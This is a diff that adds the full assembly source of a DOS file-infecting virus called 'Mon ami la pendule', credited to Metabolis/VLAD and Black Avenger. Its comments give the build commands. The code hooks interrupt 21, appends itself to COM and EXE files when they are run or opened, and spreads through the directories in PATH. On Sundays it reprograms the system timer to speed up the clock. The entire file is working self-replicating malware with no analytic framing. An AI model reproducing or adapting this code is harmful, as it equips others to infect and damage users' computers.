@@ -1,0 +1,636 @@
+
+; [Mon ami la pendule]
+; "My friend the clock"
+;
+; by Metabolis/VLAD
+; and Black Avenger of Moscow
+;
+; Basically I needed a shell to contain the payload I'd 
+; written for one of my own viruses but I kinda stuffed
+; up slightly and wanted to release this before vlad#3.
+; As a favour to me Black Avenger gave me his first virus
+; to use with my payload.  He asked only to be given
+; credit in the asm source itself, so I've just stuck
+; my handle down there in the code  (can't let a virus
+; have no one responsible for it now can I? :)
+;
+; compile with:
+; tasm /m2 monami.asm
+; tlink monami.obj
+; exe2bin monami.exe monami.com
+;
+; hooks int 21
+; infects on - execution
+;            + open
+;            + extended open
+; will infect files in the PATH environment variable
+
+        .MODEL TINY
+        .CODE
+        .RADIX 16
+
+START:
+        pushf
+        cli
+        call    DELTA
+DELTA:
+        pop     si
+        sub     si,DELTA-START
+        push    cs
+        push    si
+        push    ax
+        mov     bx,-1
+        mov     ah,4A
+        int     21
+        sub     bx,(MEM-START+0f)/10
+        push    bx
+        push    es
+        mov     bp,ds
+        add     bx,bp
+        mov     es,bx
+        sub     di,di
+        mov     cx,TOP-START
+        push    cx
+        push    si
+        push    cs
+        cld
+        rep     movs byte ptr [di],cs:[si]
+        push    es
+        mov     cl,offset RESTART
+        push    cx
+        retf
+RESTART:
+        pop     es
+        pop     di
+        pop     cx
+PGM_SEG:
+        lea     ax,[bp-100]
+        mov     ds,ax
+PGM_OFF:
+        mov     si,RTRN-START+1100
+        rep     movsb
+        mov     ah,2C
+        int     21
+        call    CHECKSUM
+        mov     ax,3521
+        int     21
+        push    cs
+        pop     ds
+        mov     si,offset REAL_INT21
+        mov     [si+CHAINDOS+1-REAL_INT21],bx
+        mov     [si+CHAINDOS+3-REAL_INT21],es
+        pop     es
+        pop     bx
+        xchg    si,dx
+        mov     ah,25
+        int     21
+        dec     bx
+        jz      EXIT
+        mov     ah,4A
+        int     21
+        mov     ax,cs
+        dec     ax
+        mov     ds,ax
+        mov     di,2
+        mov     byte ptr [di-1],8
+        stosw
+CHECKDATE:
+        mov     ah,2Ah                          ; get system date
+        int     21h
+
+        or      al,al                           ; is today Sunday?
+        jne     EXIT                            ; nope, carry on
+OVERDRIVE:                                      ; speed up the computer
+        mov     ax,34h                          ; clock about 10 TIMEs
+        out     43h,ax                          ; port 43h Control Word
+                                                ; (write only)
+        mov     ax,11h                          ; port 40h Channel 0 counter
+        out     40h,ax                          ; (read/write)
+        jmp     EXIT
+
+COPYR   db      '[Mon ami la pendule] - Metabolis/VLAD'
+
+EXIT:
+        push    es
+        pop     ds
+        pop     ax
+        iret
+
+CHECKSUM:
+        mov     si,offset SPREADING_THE_DISEASE
+CHECKSUM_LUP:
+        lods    word ptr cs:[si]
+        add     cx,ax
+        xor     dx,cx
+        cmp     si,offset GOT_POS
+        jb      CHECKSUM_LUP
+        ret
+
+ERROR_HANDLER:
+        mov     al,3
+        iret
+
+REAL_INT21:
+        pushf
+        cld
+        cmp     ax,2521
+        jne     TIME
+CHKS1:
+        cmp     cx,80
+        jne     _CHAINDOS
+CHKS2:
+        cmp     si,80
+        jne     _CHAINDOS
+        mov     bx,1
+        popf
+        iret
+
+TIME:
+        push    ax
+        push    si
+        cmp     ah,2C
+        jne     SPREAD
+        call    DOS
+        push    cx
+        push    dx
+        call    CHECKSUM
+        mov     word ptr cs:[CHKS1+2],cx
+        mov     word ptr cs:[CHKS2+2],dx
+        pop     dx
+        pop     cx
+        pop     si
+        pop     ax
+        popf
+        iret
+SPREAD:
+        push    cx
+        push    dx
+        push    bx
+        push    bp
+        push    di
+        push    es
+        push    ds
+        cmp     ax,4B00
+        je      SPREADING_THE_DISEASE
+        cmp     ah,3Dh
+        je      SPREADING_THE_DISEASE
+        cmp     ax,6C00
+        jne     GET_OUT
+        and     dx,3
+        dec     dx
+        mov     dx,si
+        jz      SPREADING_THE_DISEASE
+GET_OUT:
+        pop     ds
+        pop     es
+        pop     di
+        pop     bp
+        pop     bx
+        pop     dx
+        pop     cx
+        pop     si
+        pop     ax
+_CHAINDOS:
+        popf
+CHAINDOS:
+        db      0EA
+        dd      ?
+
+SPREADING_THE_DISEASE:
+        xchg    bp,ax
+        sub     bx,bx        
+        mov     es,bx
+        mov     bl,90
+        mov     ax,cs
+        xchg    ax,es:[bx+2]
+        push    ax
+        mov     ax,offset ERROR_HANDLER
+        xchg    ax,es:[bx]
+        push    ax
+        push    bx
+        push    es
+        mov     ah,2F
+        call    DOS
+        push    bx
+        push    es
+        push    dx
+        push    ds
+        push    cs
+        pop     ds
+        mov     dx,offset DTA
+        mov     ah,1A
+        call    DOS
+        pop     ds
+        pop     dx
+        mov     ah,4E
+        call    FIND
+SPREAD_LUP:
+        mov     si,offset BUF
+        push    bp
+        push    dx
+        push    ds
+        mov     ax,4301
+        push    ax
+        jc      _ATTR
+        cmp     word ptr cs:[si+1C-44],10
+        jnb     __ATTR
+        mov     bl,cs:[si+19-44]
+        shr     bl,1
+        cmp     bl,20
+        jnb     __ATTR
+        mov     cx,1F04
+        and     cx,cs:[si+15-44]
+        test    cl,cl
+        jnz     __ATTR
+        cmp     bl,ch
+        je      __ATTR
+        call    SET_ATTR
+        jc      _ATTR
+        mov     ax,3D02
+        call    DOS
+        jnc     OPEN
+__ATTR:
+        cmc
+_ATTR:
+        jmp     ATTR
+OPEN:
+        push    cs
+        pop     ds
+        xchg    bx,ax
+        mov     cl,40
+        mov     ah,3F
+        call    BUF_IO
+        jc      CLOSE_CY
+        cmp     word ptr [si],'ZM'
+        je      GOT_EXE
+        cmp     word ptr [si],'MZ'
+        je      GOT_EXE
+        push    cs
+        pop     es
+        mov     di,offset DTA+1E
+        mov     cl,0E
+        repne   scasb
+        mov     ax,[di-4]
+        cmp     ax,'XE'
+        je      CHECK_EXT
+        cmp     ax,'OC'
+        jne     _CLOSE_NZ
+        mov     al,'M'
+CHECK_EXT:
+        cbw
+        sub     al,[di-2]
+        jnz     _CLOSE_NZ
+GOT_COM:
+        mov     word ptr [ADJ_HEAD+1],ax
+        cwd
+        cmp     byte ptr [si],0E8
+        je      DISP_3
+        cmp     byte ptr [si],0E9
+        jne     _GOT_POS
+DISP_3:
+        mov     al,3
+        add     ax,[si+1]
+_GOT_POS:
+        jmp     GOT_POS
+GOT_EXE:
+        inc     word ptr [si+0C]
+_CLOSE_NZ:
+        jnz     CLOSE_NZ
+        mov     di,[si+14]
+        cmp     di,START-TOP-10
+        ja      CLOSE_NZ
+        cmp     cx,[si+18]
+        jne     SKIP_PM
+        les     dx,[si+3C]
+        call    SEEKES
+        call    IN4
+        jc      SKIP_PM
+        cmp     word ptr [si+1A],'EN'
+        je      _CLOSE
+SKIP_PM:
+        mov     ax,[si+16]
+        call    I_MUL
+        sub     cx,cx
+        add     ax,di
+        adc     dx,cx
+        call    CHECK_STACK
+CLOSE_CY:
+        jc      _CLOSE
+        push    ax
+        push    dx
+        add     ax,TOP-START
+        adc     dx,cx
+        sub     ax,[si+1A-44]
+        sbb     dx,[si+1C-44]
+        cmc
+        jc      bad_entry
+        les     ax,[si+1A-44]
+        mov     dx,es
+        call    CHECK_STACK
+bad_entry:
+        pop     di
+        pop     bp
+        jc      _CLOSE
+        push    ax
+        push    dx
+        mov     ch,2  
+        div     cx
+        test    dx,dx
+        jz      SKIP_INC
+        inc     ax
+SKIP_INC:
+        cmp     ax,[si+4]
+        pop     dx
+        pop     ax
+CLOSE_NZ:
+        jne     _CLOSE
+        add     ax,TOP-START
+        adc     dx,0 
+        div     cx
+        test    dx,dx
+        jz      SKIP_INC1
+        inc     ax
+SKIP_INC1:
+        mov     [si+4],ax
+        mov     [si+2],dx
+        call    SEEK_RELOCTBL
+        inc     word ptr [si+6]
+RELOC_LUP:
+        dec     word ptr [si+6]
+        jz      RELOC_END
+        call    IN4
+        mov     ax,[si+1C]
+        call    I_MUL
+        add     ax,[si+1A]
+        adc     dx,0
+        sub     ax,bp
+        sbb     dx,di
+        jnc     CHECK
+        inc     ax
+        jnz     RELOC_LUP
+        inc     dx
+RELOC_NXT:
+        jnz     RELOC_LUP
+_CLOSE:
+        jmp     __CLOSE
+CHECK:
+        jnz     RELOC_LUP
+        cmp     ax,TOP-START
+        jnb     RELOC_NXT
+        add     ax,[si+1A-44]
+        adc     dx,[si+1C-44]
+        mov     cl,10
+        div     cx
+        sub     ax,[si+8]
+        mov     word ptr [si+1A],dx
+        mov     word ptr [si+1C],ax
+        mov     dx,-4
+        mov     cx,-1
+        mov     ax,4201
+        call    DOS
+        mov     ah,40
+        call    OUT4
+        jnc     RELOC_LUP
+__CLOSE:
+        jmp     CLOSE
+RELOC_END:
+        mov     ax,[si+8]
+        mov     word ptr [ADJ_HEAD+1],ax
+        sub     dx,dx
+        call    SEEKCX
+        mov     cl,6
+        mov     ah,40
+        call    BUF_IO
+        jc      CLOSE
+        xchg    bp,ax
+        xchg    di,dx
+GOT_POS:
+        xchg    dx,ax
+        xchg    cx,ax
+        push    cx
+        push    dx
+        call    seek
+        mov     ah,3F
+        call    BUF_IOCX
+        jc      CLOSE_POS
+        les     dx,[si+1A-44]
+        call    SEEKES
+        mov     cl,10
+        div     cx
+        add     ax,cx
+ADJ_HEAD:
+        sub     ax,0
+        mov     word ptr [PGM_SEG+2],ax
+        mov     word ptr [PGM_OFF+1],dx
+        mov     ah,40
+        call    BUF_IOCX
+CLOSE_POS:
+        pop     dx
+        pop     cx
+        jc      CLOSE
+        call    seek
+        mov     cx,TOP-START
+        mov     ah,40
+        cwd
+        call    IO
+        jc      CLOSE
+        les     cx,[si+16-44]
+        mov     dx,es
+        and     cx,-20
+        mov     ax,dx
+        shr     ah,1
+        or      cl,ah
+        mov     ax,5701
+        or      byte ptr [GOT_ONE],al
+        call    DOS
+CLOSE:
+        mov     ah,3E
+        call    DOS
+        clc
+ATTR:
+        pop     ax
+        pop     ds
+        pop     dx
+        jc      SKIP_ATTR
+        mov     cl,cs:[si+15-44]
+        call    SET_ATTR
+SKIP_ATTR:
+        pop     ax
+        cmp     ah,4Bh
+        je      SPREAD_CONT
+FIX_PTRS:
+        pop     ds
+        pop     dx
+        mov     ah,1A
+        call    DOS
+        pop     es
+        pop     di
+        pop     ax
+        stosw
+        pop     ax
+        stosw
+        jmp     GET_OUT
+SPREAD_CONT:
+        push    cs
+        pop     es
+        mov     dx,offset NAM
+        shr     al,1
+        inc     ax
+        xchg    bp,ax
+        mov     ah,4F
+        jc      GOT_ONE
+        sub     bx,bx
+        mov     ah,62
+        call    DOS
+        test    bx,bx
+        jz      FIX_PTRS
+        mov     ds,bx
+        sub     si,si
+        cmp     si,[si+2C]
+        jz      FIX_PTRS
+        mov     ds,[si+2C]
+SCAN_ENV:
+        lodsb
+        test    al,al
+        jnz     SCAN_ENV
+        lodsb
+        test    al,al
+        jz      FIX_PTRS
+        or      al,20
+        cmp     al,'p'
+        jne     SCAN_ENV
+        lodsw
+        or      ax,2020
+        cmp     ax,'ta'
+        jne     SCAN_NXT
+        lodsw
+        or      al,20
+        cmp     ax,'=h'
+        je      SCAN_PATH
+SCAN_NXT:
+        dec     si
+        dec     si
+        jmp     SCAN_ENV
+NEXT_DIR:
+        pop     ds
+        pop     si
+        pop     ax
+        test    al,al
+        jz      FIX_PTRS
+SCAN_PATH:
+        and     byte ptr cs:[GOT_ONE],0FE
+        mov     di,dx
+COPY_PATH:
+        lodsb
+        cmp     al,';'
+        je      END_DIR
+        test    al,al
+        jz      END_DIR
+        stosb
+        jmp     COPY_PATH
+END_DIR:
+        push    ax
+        push    si
+        push    ds
+        dec     di
+        mov     al,'\'
+        scasb
+        je      SET_MASK
+        stosb
+SET_MASK:
+        push    di
+        mov     ax,'.*'
+        stosw
+        cbw
+        stosw
+        mov     ah,4E
+GOT_ONE:
+        clc
+        pop     di
+        jc      NEXT_DIR
+        push    cs
+        pop     ds
+        call    FIND
+        jc      NEXT_DIR
+        push    di
+        mov     si,offset DTA+1E
+        mov     cl,7
+        rep     movsw
+        jmp     SPREAD_LUP
+        
+CHECK_STACK:
+        xchg    bp,ax
+        xchg    di,dx
+        mov     ax,[si+0E]
+        call    I_MUL
+        add     ax,[si+10]
+        adc     dx,cx
+        sub     ax,bp
+        sbb     dx,di
+        cmc
+        jnc     BELOW_STACK
+        sub     ax,TOP-START+64
+        sbb     dx,cx
+BELOW_STACK:
+        xchg    di,dx
+        xchg    bp,ax
+        ret
+
+I_MUL:
+        add     ax,[si+8]
+        mov     dx,10
+        imul    dx
+        ret
+
+IN4:
+        mov     ah,3F
+OUT4:
+        mov     dx,offset BUF+1A
+        mov     cx,4
+        jmp     IO
+BUF_IOCX:
+        mov     cx,TOP-START
+BUF_IO:
+        mov     dx,si
+IO:
+        call    DOS
+        jc      IO_RTRN
+        sub     ax,cx
+IO_RTRN:
+        ret
+
+FIND:
+        mov     cl,23
+SET_ATTR:
+        sub     ch,ch
+        jmp     DOS
+
+SEEK_RELOCTBL:
+        mov     dx,[si+18]
+SEEKCX:
+        sub     cx,cx
+        test    ax,0
+        org     $-2
+SEEKES:
+        mov     cx,es
+seek:
+        mov     ax,4200
+DOS:
+        pushf
+        cli
+        push    cs
+        call    CHAINDOS
+RTRN:
+        ret
+
+TOP:
+
+NAM     db      60 dup(?)
+DTA     db      44 dup(?)
+BUF     db      TOP-START dup(?)
+
+MEM:
+
+        end     START
+
+
